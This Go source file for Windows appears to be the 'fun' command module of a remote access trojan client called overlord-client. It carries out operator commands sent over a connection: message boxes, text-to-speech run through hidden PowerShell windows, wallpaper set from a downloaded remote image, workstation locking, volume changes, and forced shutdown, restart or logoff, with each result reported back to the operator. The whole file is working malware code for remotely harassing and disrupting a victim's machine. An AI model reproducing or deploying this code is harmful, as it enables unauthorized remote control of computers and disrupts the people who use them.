//go:build windows

package handlers

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
	"unsafe"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var (
	procMessageBoxW     = user32.NewProc("MessageBoxW")
	procLockWorkStation = user32.NewProc("LockWorkStation")
	procSysParamsInfo   = user32.NewProc("SystemParametersInfoW")
)

const (
	spiSetDeskWallpaper = 0x0014
	spifUpdateIniFile   = 0x01
	spifSendChange      = 0x02
)

func HandleFun(ctx context.Context, env *rt.Env, cmdID string, envelope map[string]interface{}) error {
	payload, _ := envelope["payload"].(map[string]interface{})
	if payload == nil {
		return funResult(ctx, env, cmdID, false, "missing payload")
	}
	action, _ := payload["action"].(string)

	switch action {
	case "msgbox":
		title, _ := payload["title"].(string)
		text, _ := payload["text"].(string)
		if title == "" {
			title = "Notice"
		}
		go func() {
			titlePtr, _ := syscall.UTF16PtrFromString(title)
			textPtr, _ := syscall.UTF16PtrFromString(text)
			procMessageBoxW.Call(0,
				uintptr(unsafe.Pointer(textPtr)),
				uintptr(unsafe.Pointer(titlePtr)),
				0)
		}()
		return funResult(ctx, env, cmdID, true, "message box displayed")

	case "tts":
		text, _ := payload["text"].(string)
		if text == "" {
			return funResult(ctx, env, cmdID, false, "no text provided")
		}
		escaped := strings.ReplaceAll(text, "'", "")
		ps := fmt.Sprintf(
			"Add-Type -AssemblyName System.Speech;"+
				"(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('%s')",
			escaped,
		)
		go exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps).Run()
		return funResult(ctx, env, cmdID, true, "speaking")

	case "wallpaper":
		imgURL, _ := payload["url"].(string)
		if imgURL == "" {
			return funResult(ctx, env, cmdID, false, "no url provided")
		}
		go func() {
			tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf("wp_%d.jpg", time.Now().UnixNano()))
			if err := downloadFile(imgURL, tmpFile); err != nil {
				return
			}
			defer os.Remove(tmpFile)
			pathPtr, err := syscall.UTF16PtrFromString(tmpFile)
			if err != nil {
				return
			}
			procSysParamsInfo.Call(
				spiSetDeskWallpaper, 0,
				uintptr(unsafe.Pointer(pathPtr)),
				spifUpdateIniFile|spifSendChange,
			)
		}()
		return funResult(ctx, env, cmdID, true, "wallpaper changing")

	case "lock":
		procLockWorkStation.Call()
		return funResult(ctx, env, cmdID, true, "workstation locked")

	case "volume":
		vol := 50
		switch v := payload["volume"].(type) {
		case int8:
			vol = int(v)
		case int16:
			vol = int(v)
		case int32:
			vol = int(v)
		case int64:
			vol = int(v)
		case uint8:
			vol = int(v)
		case float32:
			vol = int(v)
		case float64:
			vol = int(v)
		}
		if vol < 0 {
			vol = 0
		}
		if vol > 100 {
			vol = 100
		}
		// waveOutSetVolume via winmm — sets master wave volume (L+R packed into DWORD)
		ps := fmt.Sprintf(
			`Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class WM{[DllImport("winmm.dll")]public static extern int waveOutSetVolume(System.IntPtr h,int v);}';`+
				`$v=[int](%.2f*0xFFFF);[WM]::waveOutSetVolume([System.IntPtr]::Zero,($v -bor ($v -shl 16)))`,
			float64(vol)/100.0,
		)
		go exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps).Run()
		return funResult(ctx, env, cmdID, true, fmt.Sprintf("volume set to %d%%", vol))

	case "shutdown":
		mode, _ := payload["mode"].(string)
		var args []string
		switch mode {
		case "restart":
			args = []string{"/r", "/f", "/t", "0"}
		case "hibernate":
			args = []string{"/h"}
		case "sleep":
			// rundll32 powrprof.dll,SetSuspendState 0,1,0
			go exec.Command("rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0").Run()
			return funResult(ctx, env, cmdID, true, "sleeping")
		case "logoff":
			args = []string{"/l", "/f"}
		default: // "shutdown"
			args = []string{"/s", "/f", "/t", "0"}
		}
		go exec.Command("shutdown.exe", args...).Run()
		return funResult(ctx, env, cmdID, true, mode+" initiated")

	default:
		return funResult(ctx, env, cmdID, false, "unknown action: "+action)
	}
}

func funResult(ctx context.Context, env *rt.Env, cmdID string, ok bool, msg string) error {
	return wire.WriteMsg(ctx, env.Conn, wire.FunResult{
		Type:      "fun_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   msg,
	})
}

func downloadFile(url, dest string) error {
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	f, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(f, resp.Body)
	return err
}
